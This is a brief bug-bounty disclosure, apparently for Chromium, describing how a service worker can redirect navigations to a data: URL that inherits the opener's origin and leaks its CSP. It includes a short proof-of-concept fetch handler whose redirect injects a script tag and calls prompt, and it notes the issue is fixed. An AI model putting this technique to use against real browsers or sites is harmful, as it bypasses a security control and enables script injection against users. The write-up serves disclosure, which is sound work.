---
title: Service workers allowing redirects to data URLs (Awarded $4000)
---

Top-level navigations to `data:` are not normally allowed. <https://blog.mozilla.org/security/2017/11/27/blocking-top-level-navigations-data-urls-firefox-59/>  
This navigation inherits from the opener as shown for the origin in the protocol confirmation dialog and also leaks the victims CSP.

```js
self.addEventListener('fetch', function (event) {
  event.respondWith(
    Response.redirect('data:text/html,<script>prompt("Test")</script>')
  );
});
```

This issue was fixed in <https://issues.chromium.org/379337758>
